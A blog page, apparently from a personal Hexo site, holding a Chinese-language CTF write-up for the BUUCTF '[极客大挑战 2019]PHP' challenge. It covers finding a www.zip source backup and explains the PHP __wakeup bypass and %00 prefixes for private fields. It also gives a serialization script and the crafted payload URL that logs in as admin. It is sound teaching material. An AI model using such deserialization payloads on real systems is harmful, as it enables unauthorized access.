@@ -1,0 +1,186 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>“buu-序列化与反序列化” | 墨水彩笔</title><meta name="author" content="徐小宇"><meta name="copyright" content="徐小宇"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="buu中体验序列化的解题题目来源-[极客大挑战 2019]PHP11.审查网页元素 解题先审查一下元素是个好习惯，但在这道题目里面好像也没有发现什么。 2.扫描一下网站（我用的是dirsearch）在扫描的过程中可以进行一些特殊的尝试： robots.txt,login,index.phps…..学完这个发现以后可以尝试（www.zip） 我扫描了很久，所以我直接引用别人的成果了。 扫面发现有压缩">
+<meta property="og:type" content="article">
+<meta property="og:title" content="“buu-序列化与反序列化”">
+<meta property="og:url" content="http://example.com/2021/04/05/%E2%80%9Cbuu-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%9D/index.html">
+<meta property="og:site_name" content="墨水彩笔">
+<meta property="og:description" content="buu中体验序列化的解题题目来源-[极客大挑战 2019]PHP11.审查网页元素 解题先审查一下元素是个好习惯，但在这道题目里面好像也没有发现什么。 2.扫描一下网站（我用的是dirsearch）在扫描的过程中可以进行一些特殊的尝试： robots.txt,login,index.phps…..学完这个发现以后可以尝试（www.zip） 我扫描了很久，所以我直接引用别人的成果了。 扫面发现有压缩">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-04-05T06:55:39.000Z">
+<meta property="article:modified_time" content="2021-04-05T07:35:35.846Z">
+<meta property="article:author" content="徐小宇">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/04/05/%E2%80%9Cbuu-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%9D/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2021-04-05 15:35:35'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">25</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#buu%E4%B8%AD%E4%BD%93%E9%AA%8C%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E8%A7%A3%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">buu中体验序列化的解题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP1"><span class="toc-number">1.1.</span> <span class="toc-text">题目来源-[极客大挑战 2019]PHP1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.审查网页元素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%AB%E6%8F%8F%E4%B8%80%E4%B8%8B%E7%BD%91%E7%AB%99%EF%BC%88%E6%88%91%E7%94%A8%E7%9A%84%E6%98%AFdirsearch%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.扫描一下网站（我用的是dirsearch）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%88%91%E7%8C%9C%E4%BD%A0%E5%85%88%E6%89%93%E5%BC%80flag"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.我猜你先打开flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%80%98%E5%8A%A0%E6%B2%B9%E7%AB%99%E2%80%99"><span class="toc-number">2.</span> <span class="toc-text">‘加油站’</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BF%9B%E8%A1%8C%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.0.1.</span> <span class="toc-text">4.进行序列化:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-number">2.0.2.</span> <span class="toc-text">5.链接：</span></a></li></ol></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">“buu-序列化与反序列化”</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-04-05T06:55:39.000Z" title="Created 2021-04-05 14:55:39">2021-04-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-04-05T07:35:35.846Z" title="Updated 2021-04-05 15:35:35">2021-04-05</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="buu中体验序列化的解题"><a href="#buu中体验序列化的解题" class="headerlink" title="buu中体验序列化的解题"></a>buu中体验序列化的解题</h1><h2 id="题目来源-极客大挑战-2019-PHP1"><a href="#题目来源-极客大挑战-2019-PHP1" class="headerlink" title="题目来源-[极客大挑战 2019]PHP1"></a>题目来源-[极客大挑战 2019]PHP1</h2><h3 id="1-审查网页元素"><a href="#1-审查网页元素" class="headerlink" title="1.审查网页元素"></a>1.审查网页元素</h3><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E2%80%9Cbuu-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%9D/image-20210405145747011.png?raw=true" alt="image-20210405145747011.png"></p>
+<p>解题先审查一下元素是个好习惯，但在这道题目里面好像也没有发现什么。</p>
+<h3 id="2-扫描一下网站（我用的是dirsearch）"><a href="#2-扫描一下网站（我用的是dirsearch）" class="headerlink" title="2.扫描一下网站（我用的是dirsearch）"></a>2.扫描一下网站（我用的是dirsearch）</h3><p>在扫描的过程中可以进行一些特殊的尝试：</p>
+<p>robots.txt,login,index.phps…..学完这个发现以后可以尝试（<a target="_blank" rel="noopener" href="http://www.zip)/">www.zip）</a></p>
+<p>我扫描了很久，所以我直接引用别人的成果了。</p>
+<p>扫面发现有压缩包的存在，于是构造url：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">97c9366b-27a8-425b-b23a-8f054d6b1a47.node3.buuoj.cn&#x2F;www.zip</span><br></pre></td></tr></table></figure>
+
+<p>访问后，将文件（压缩包下载），打开：</p>
+<h3 id="3-我猜你先打开flag"><a href="#3-我猜你先打开flag" class="headerlink" title="3.我猜你先打开flag"></a>3.我猜你先打开flag</h3><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E2%80%9Cbuu-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%9D/image-20210405150918447.png?raw=true" alt="image-20210405150918447.png"></p>
+<p>发现是个假的，那么继续访问其他文件。</p>
+<p>我先访问了Index.php文件–因为这个为关键的基础文件：</p>
+<p>   <img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E2%80%9Cbuu-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%9D/image-20210405151132672.png?raw=true" alt="image-20210405151132672.png"></p>
+<p>并且在其中发现了解题思路—–unserialize（序列化）</p>
+<p>最后访问class.php文件：</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E2%80%9Cbuu-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%9D/image-20210405151307849.png?raw=true" alt="image-20210405151307849.png"></p>
+<p>已经把知识点圈起来了。</p>
+<h1 id="‘加油站’"><a href="#‘加油站’" class="headerlink" title="‘加油站’"></a>‘加油站’</h1><p>1.为什么想到序列化?:    因为Index.php文件中出现unserialize函数</p>
+<p>2.为什么可以使用序列化漏洞–关键函数__wakeup():</p>
+<p>关于_wakeup函数，它的作用是在序列化前被调用，</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E2%80%9Cbuu-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%9D/image-20210405151643125.png?raw=true" alt="image-20210405151643125.png"></p>
+<p>然后根据它后面的内容，先给username定义一个值，正是因为如此我们才不能用正常的手段将username的值改为admin。</p>
+<p>3.__wakeup()方法绕过<br>作用：<br>与__sleep()函数相反，__sleep()函数，是在序序列化时被自动调用。__wakeup()函数，在反序列化时，被自动调用。<br>绕过：<br>当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。<br>所以在上面name后面的2表示有2个属性，我们改成3之后他会绕过__wakeup()<br>4.<strong>关于private</strong>：<br>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上%00的前缀。字符串长度也包括所加前缀的长度。其中 %00 字符也是计算长度的。—很重要哦！！！</p>
+<h3 id="4-进行序列化"><a href="#4-进行序列化" class="headerlink" title="4.进行序列化:"></a>4.进行序列化:</h3><p>我使用的是菜鸟教程的在线编辑程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name</span><br><span class="line">&#123;</span><br><span class="line">	private $username&#x3D;&#39;admin&#39;;	&#x2F;&#x2F;根据class文件的提示</span><br><span class="line">	private $password&#x3D;100;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;new Name();</span><br><span class="line">echo serialize($a);</span><br><span class="line">echourlencode(serialize($a))</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E2%80%9Cbuu-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%9D/image-20210405152133412.png?raw=true" alt="image-20210405152133412.png"></p>
+<p>这是最后的输出结果，但如果你直接构造url会发现不能使用。因此我们根据加油站的内容对序列化的内容进行修改：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;未修改</span><br><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; 修改</span><br></pre></td></tr></table></figure>
+
+<p>1.为什么将2-&gt;3:因为要绕过_wakeup函数，否则username值默认。</p>
+<p>2.为什么未修改时第一个的长度是14，因为private的原因，使用private后两个变化</p>
+<p>1.后面的值的前缀加了clsss的名字。</p>
+<p>2.在class的前后面因该有%00-&gt;%00Name%00,因为%00也算一个字符所以长度为x+2。</p>
+<p>根据以上的内容我们对url进行修改：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;97c9366b-27a8-425b-b23a-8f054d6b1a47.node3.buuoj.cn&#x2F;index.php?select&#x3D;O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>select是怎么来的？</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E2%80%9Cbuu-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%9D/image-20210405152713346.png?raw=true" alt="image-20210405152713346.png"></p>
+<h3 id="5-链接："><a href="#5-链接：" class="headerlink" title="5.链接："></a>5.链接：</h3><p>在线菜鸟工具：<a target="_blank" rel="noopener" href="https://c.runoob.com/compile/1">https://c.runoob.com/compile/1</a></p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42250840/article/details/106998286">https://blog.csdn.net/qq_42250840/article/details/106998286</a></p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">徐小宇</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/04/05/%E2%80%9Cbuu-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%9D/">http://example.com/2021/04/05/%E2%80%9Cbuu-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%9D/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/04/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-1/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">攻防世界-1</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 徐小宇</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
